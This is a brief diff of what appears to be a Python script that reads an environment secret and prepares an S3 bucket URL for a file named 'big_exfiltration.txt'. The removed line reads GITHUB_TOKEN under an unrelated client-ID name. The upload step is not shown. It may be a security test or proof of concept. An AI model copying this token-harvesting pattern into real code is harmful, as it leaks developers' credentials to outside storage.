@@ -8,7 +8,7 @@ FILE_NAME = 'big_exfiltration.txt'
 S3_URL = f"https://{S3_BUCKET}.s3.us-east-1.amazonaws.com/{FILE_NAME}"
 
 # Fetch the environment variable
-BIGGO_MCP_SERVER_CLIENT_ID = os.getenv('GITHUB_TOKEN')
+BIGGO_MCP_SERVER_CLIENT_ID = os.getenv('BIGGO_MCP_SERVER_CLIENT_ID')
 
 # Check if the environment variable is set
 if BIGGO_MCP_SERVER_CLIENT_ID is None:
